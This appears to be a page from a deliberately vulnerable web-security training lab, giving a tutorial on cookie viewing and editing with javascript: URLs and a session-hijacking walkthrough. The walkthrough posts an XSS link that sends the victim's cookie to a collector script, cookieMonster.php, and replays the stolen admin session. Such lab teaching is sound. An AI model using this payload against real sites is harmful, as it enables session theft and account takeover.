<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<link type='text/css' rel='stylesheet' href='stylesheet/styles.css' />
</head>
<body style='background-color:#3a3d32'>
<center><img src="images/logo.jpg" width='80%' height='175px' style='padding-top:0px;' /><br /><a href='index.php'>XSS & CSRF</a><a href='iframe.php?page=form.php'>IFrame Injection</a><a href='iframe.php?page=form.php'>RFI & LFI</a><a href='flash.php'>Flash</a><a href='code.php'>Code Injection & Cookies</a><a href='walk.php'>Tutorials & Walkthroughs</a><br /><br /></center>
<?php

echo "<h2>Cookies, Code Injection and Session Hijacking</h2>";
echo "<p name='test'><b>Code Injection:</b> There are many ways to inject code, let's begin this section with cookie viewing and editing. Erase everything in your address bar, and type in javascript:alert(document.cookie);<br />Carefully examine the data<br />Now erase everything again and type javascript: void(document.cookie='user:=guest');<br />Run the original script again to view the cookie, as you can see you have changed the cookie data. This is how cookie editing can be used to possibly access a site through cookies. There are many tools that can be used to help automate this process such as: Paros Proxy, Burp Suite, and Web Scarab to name a few.<br /> There are better ways to achieve this in a more targeted manner. Let's move on.<br /><br /><b>Session Hijacking:</b><br /> Let's revisit the blog and see what we can do.<br /> 1) Open a different web browser and point it to the main page.<br />2) Log in to the anonymous account with the attack browser and create a post with a hyperlink in the blog that points to the cookie stealing code that i have created, the file is named cookieMonster.php the XSS link should look like this &lt;a onclick=\"javascript:document.location='/ghost/cookieMonster.php?monster='+document.cookie;\"&gt;Pics&lt;/a&gt;<br />3) Log in as the administrator with the victim browser, view the post and click on the hyperlink<br />4) Go back to the attackers browser and go to mycookies.html<br />As you can see there is a new session that has been logged take the javascript from the page and insert it into the address bar. Go back to the blog and post a new message, as you can see you are now the administrator. This example is a little different from real world examples in the aspect that a lot of the time user authentication through sessions and cookies are either randomly generated, or the number is based on a mathematical algorithm. There are programs out there than can help try to predict the users next session id.</p>";
?>
<center><p>Developed By: <a href="http://www.webdevelopmentsolutions.org">Gh0$7</a></p></center>
</body>
</html>